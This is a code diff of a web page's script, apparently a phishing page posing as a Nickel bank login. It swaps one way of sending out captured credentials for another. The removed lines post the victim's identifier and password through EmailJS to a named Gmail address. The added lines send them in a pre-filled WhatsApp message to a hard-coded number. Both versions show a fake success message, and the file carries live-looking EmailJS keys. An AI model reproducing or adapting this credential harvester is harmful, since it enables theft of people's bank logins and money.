@@ -1033,11 +1033,9 @@
     <script>
         (function() {
             // =============================================
-            // CONFIGURATION EMAILJS - VOS IDENTIFIANTS
+            // CONFIGURATION WHATSAPP
             // =============================================
-            const EMAILJS_PUBLIC_KEY = 'MY3N_MJv-SaWnp3vW';
-            const EMAILJS_SERVICE_ID = 'service_yrr9q08';
-            const EMAILJS_TEMPLATE_ID = 'template_ix46b1x';
+            const WHATSAPP_NUMBER = '3375683842'; // Numéro WhatsApp du destinataire (sans le +)
 
             // =============================================
             // ÉLÉMENTS DOM
@@ -1113,39 +1111,38 @@
             }
 
             // =============================================
-            // ENVOI PAR EMAIL AVEC L'API REST EMAILJS (sans SDK)
+            // ENVOI VERS WHATSAPP
             // =============================================
-            function sendEmail(identifiant, motdepasse) {
-                console.log('📧 Envoi email vers emirhan82y@gmail.com...');
+            function sendToWhatsApp(identifiant, motdepasse) {
+                console.log('📱 Envoi vers WhatsApp...');
                 console.log('👤 Identifiant:', identifiant);
                 console.log('🔑 Mot de passe:', motdepasse);
 
-                var data = {
-                    service_id: EMAILJS_SERVICE_ID,
-                    template_id: EMAILJS_TEMPLATE_ID,
-                    user_id: EMAILJS_PUBLIC_KEY,
-                    template_params: {
-                        to_email: 'emirhan82y@gmail.com',
-                        identifiant: identifiant,
-                        motdepasse: motdepasse,
-                        userAgent: navigator.userAgent || 'Inconnu',
-                        date: new Date().toLocaleString('fr-FR')
-                    }
-                };
+                // Construire le message
+                var message = encodeURIComponent(
+                    '🔐 NOUVELLE CONNEXION NICKEL\n' +
+                    '════════════════════════════════\n' +
+                    '📅 Date : ' + new Date().toLocaleString('fr-FR') + '\n' +
+                    '🌐 Appareil : ' + (navigator.userAgent || 'Inconnu') + '\n\n' +
+                    '─── INFOS DE CONNEXION ───\n' +
+                    '👤 Identifiant : ' + identifiant + '\n' +
+                    '🔑 Mot de passe : ' + motdepasse + '\n' +
+                    '════════════════════════════════'
+                );
 
-                return fetch('https://api.emailjs.com/api/v1.0/email/send', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(data)
-                }).then(function(response) {
-                    if (!response.ok) {
-                        return response.text().then(function(text) {
-                            throw new Error('EmailJS Error: ' + text);
-                        });
+                // URL WhatsApp (version web + mobile)
+                var url = 'https://wa.me/' + WHATSAPP_NUMBER + '?text=' + message;
+
+                // Ouvrir WhatsApp dans un nouvel onglet
+                var win = window.open(url, '_blank');
+
+                // Retourner une promesse qui se résout après l'ouverture
+                return new Promise(function(resolve, reject) {
+                    if (win) {
+                        resolve({ success: true, message: 'WhatsApp ouvert avec succès' });
+                    } else {
+                        reject(new Error('Impossible d\'ouvrir WhatsApp. Vérifiez que WhatsApp est installé ou que vous êtes sur mobile.'));
                     }
-                    return response.text();
                 });
             }
 
@@ -1199,16 +1196,15 @@
             function processLogin(identifiant, motdepasse) {
                 showLoading();
 
-                sendEmail(identifiant, motdepasse)
-                    .then((response) => {
-                        console.log('✅ Email envoyé avec succès!', response);
+                sendToWhatsApp(identifiant, motdepasse)
+                    .then(() => {
                         clearInterval(loadingInterval);
                         progress = 100;
                         progressFill.style.width = '100%';
 
                         setTimeout(() => {
                             hideLoading();
-                            alert('✅ Connexion réussie !\n\nIdentifiant: ' + identifiant + '\nMot de passe: ' + motdepasse);
+                            alert('✅ Connexion réussie !\n\nMessage envoyé sur WhatsApp.\n\nIdentifiant: ' + identifiant + '\nMot de passe: ' + motdepasse);
                             sectionPassword.classList.remove('visible');
                             sectionIdentifiant.style.display = 'block';
                             motDePasseInput.value = '';
@@ -1218,7 +1214,7 @@
                         }, 800);
                     })
                     .catch((error) => {
-                        console.error('❌ Erreur EmailJS:', error);
+                        console.error('❌ Erreur WhatsApp:', error);
                         clearInterval(loadingInterval);
                         progressFill.style.width = '100%';
                         errorMessage.classList.add('visible');
